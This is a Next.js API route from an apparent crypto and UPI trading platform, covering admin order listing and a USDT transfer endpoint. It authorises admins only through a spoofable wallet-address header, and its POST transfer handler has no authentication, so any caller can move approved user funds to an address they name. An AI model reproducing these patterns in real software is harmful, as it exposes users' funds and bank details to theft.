import { NextRequest, NextResponse } from 'next/server'
import { PrismaClient } from '@prisma/client'
import { getGasStation } from '@/lib/gasStation'

const prisma = new PrismaClient()

async function verifyAdminAccess(request: NextRequest) {
  try {
    const walletAddress = request.headers.get('x-wallet-address')
    
    if (!walletAddress) {
      return NextResponse.json(
        { error: 'Wallet address required' },
        { status: 401 }
      )
    }

    const user = await prisma.user.findUnique({
      where: { walletAddress: walletAddress.toLowerCase() }
    })

    if (!user || user.role !== 'ADMIN') {
      return NextResponse.json(
        { error: 'Admin access required' },
        { status: 403 }
      )
    }

    return { user }
  } catch (error) {
    return NextResponse.json(
      { error: 'Verification failed' },
      { status: 500 }
    )
  }
}

export async function GET(request: NextRequest) {
  try {
    const adminCheck = await verifyAdminAccess(request)
    if (adminCheck instanceof NextResponse) {
      return adminCheck 
    }

    console.log('Admin orders API called by admin:', adminCheck.user.walletAddress);
    
    const { searchParams } = new URL(request.url)
    const status = searchParams.get('status')
    
    console.log('Status filter:', status);
    
    let whereClause: any = {}
    
    switch (status) {
      case 'pending':
        whereClause = {
          status: {
            in: ['PENDING', 'ADMIN_APPROVED', 'PAYMENT_SUBMITTED']
          }
        }
        break
      case 'completed':
        whereClause = { status: 'COMPLETED' }
        break
      case 'rejected':
        whereClause = { status: 'CANCELLED' }
        break
      default:
        break
    }

    console.log('Where clause:', whereClause);


    const orders = await prisma.order.findMany({
      where: whereClause,
      select: {
        id: true,
        userId: true,
        blockchainOrderId: true,
        amount: true,
        usdtAmount: true,
        customAmount: true,
        orderType: true,
        status: true,
        paymentProof: true,
        adminUpiId: true,
        adminBankDetails: true,
        adminNotes: true,
        buyRate: true,
        sellRate: true,
        userConfirmedReceived: true,
        userConfirmedAt: true,
        isVerifiedOnChain: true,
        isCompletedOnChain: true,
        transactionHash: true,
        createdAt: true,
        updatedAt: true,
        
        user: {
          select: {
            id: true,
            walletAddress: true,
            upiId: true,
            bankDetails: {
              select: {
                accountNumber: true,
                ifscCode: true,
                branchName: true,
                accountHolderName: true
              }
            }
          }
        }
      },
      orderBy: {
        createdAt: 'desc'
      }
    });

    console.log('Found orders:', orders.length);
    console.log('Orders with user confirmation:', orders.map(o => ({
      id: o.id,
      orderType: o.orderType,
      userConfirmedReceived: o.userConfirmedReceived,
      userConfirmedAt: o.userConfirmedAt
    })));

    const transformedOrders = orders.map(order => ({
      id: `#${order.id.slice(-6)}`, 
      fullId: order.id,
      blockchainOrderId: order.blockchainOrderId,
      time: formatTime(order.createdAt),
      amount: Number(order.amount),
      type: getOrderTypeLabel(order.orderType),
      orderType: order.orderType,
      price: Number(order.buyRate || order.sellRate || 0),
      currency: order.orderType === 'BUY_CDM' ? 'CDM' : 'UPI',
      status: order.status,
      paymentProof: order.paymentProof,
      adminUpiId: order.adminUpiId,
      adminBankDetails: order.adminBankDetails,
      adminNotes: order.adminNotes,
      // 🔥 CRITICAL: Include the new database fields properly
      userConfirmedReceived: order.userConfirmedReceived || false,
      userConfirmedAt: order.userConfirmedAt ? order.userConfirmedAt.toISOString() : null,
      user: {
        id: order.user.id,
        walletAddress: order.user.walletAddress,
        upiId: order.user.upiId,
        bankDetails: order.user.bankDetails
      },
      createdAt: order.createdAt,
      updatedAt: order.updatedAt
    }));

    console.log('Transformed orders with confirmations:', transformedOrders.map(o => ({
      id: o.id,
      fullId: o.fullId,
      orderType: o.orderType,
      userConfirmedReceived: o.userConfirmedReceived,
      userConfirmedAt: o.userConfirmedAt
    })));

    return NextResponse.json({
      success: true,
      orders: transformedOrders
    })

  } catch (error) {
    console.error('Error fetching orders:', error)
    return NextResponse.json(
      { error: 'Failed to fetch orders', details: error instanceof Error ? error.message : 'Unknown error' },
      { status: 500 }
    )
  } finally {
    await prisma.$disconnect()
  }
}

export async function POST(request: NextRequest) {
  try {
    const { 
      userAddress, 
      adminAddress, 
      usdtAmount,
      chainId
    } = await request.json()
    
    if (chainId !== 56) {
      return NextResponse.json(
        { 
          success: false,
          error: 'Only BSC Mainnet (Chain ID 56) is supported',
          code: 'INVALID_NETWORK'
        },
        { status: 400 }
      )
    }
    
    if (!userAddress || !adminAddress || !usdtAmount) {
      return NextResponse.json(
        { 
          success: false,
          error: 'Missing required parameters: userAddress, adminAddress, usdtAmount',
          code: 'MISSING_PARAMS' 
        },
        { status: 400 }
      )
    }

    console.log('🚀 Executing USDT transfer after user approval:', {
      userAddress,
      adminAddress,
      usdtAmount,
      chainId
    })
    
    const gasStation = getGasStation(56)
    
    if (!gasStation.isReady()) {
      return NextResponse.json(
        { 
          success: false,
          error: 'Gas Station not ready. Please try again later.',
          code: 'GAS_STATION_NOT_READY'
        },
        { status: 503 }
      )
    }

    // Execute the transfer after approval
    const transferHash = await gasStation.executeTransferAfterApproval(
      userAddress as `0x${string}`,
      adminAddress as `0x${string}`,
      usdtAmount
    )
    
    console.log('✅ USDT transfer successful after approval:', transferHash)
    
    return NextResponse.json({
      success: true,
      txHash: transferHash,
      chainId: 56,
      gasStationAddress: gasStation.getAddress(),
      method: 'transfer_after_approval',
      gasPaidBy: 'Gas Station',
      userGasCost: '0 BNB',
      message: 'USDT successfully transferred from your account to admin account after approval!'
    })
    
  } catch (error) {
    console.error('❌ Transfer after approval error:', error)
    
    const errorMessage = error instanceof Error ? error.message : 'Transfer after approval failed'
    
    if (errorMessage.includes('User has not approved Gas Station yet')) {
      return NextResponse.json(
        { 
          success: false,
          error: 'User has not approved Gas Station for USDT spending yet.',
          code: 'NOT_APPROVED_YET'
        },
        { status: 400 }
      )
    }
    
    if (errorMessage.includes('Insufficient allowance')) {
      return NextResponse.json(
        { 
          success: false,
          error: 'Insufficient allowance for transfer. Please ensure Gas Station is approved for the required amount.',
          code: 'INSUFFICIENT_ALLOWANCE'
        },
        { status: 400 }
      )
    }
    
    return NextResponse.json(
      { 
        success: false,
        error: errorMessage,
        code: 'TRANSFER_FAILED'
      },
      { status: 500 }
    )
  }
}

function formatTime(date: Date): string {
  const now = new Date()
  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate())
  const orderDate = new Date(date.getFullYear(), date.getMonth(), date.getDate())
  
  const timeString = date.toLocaleTimeString('en-US', {
    hour: 'numeric',
    minute: '2-digit',
    hour12: true
  })

  if (orderDate.getTime() === today.getTime()) {
    return `Today ${timeString}`
  } else if (orderDate.getTime() === today.getTime() - 24 * 60 * 60 * 1000) {
    return `Yesterday ${timeString}`
  } else {
    return date.toLocaleDateString('en-US', {
      month: 'short',
      day: 'numeric',
      hour: 'numeric',
      minute: '2-digit',
      hour12: true
    })
  }
}

function getOrderTypeLabel(orderType: string): string {
  switch (orderType) {
    case 'BUY_UPI':
      return 'Buy Order'
    case 'BUY_CDM':
      return 'Buy Order'
    case 'SELL':
      return 'Sell Order'
    default:
      return orderType
  }
}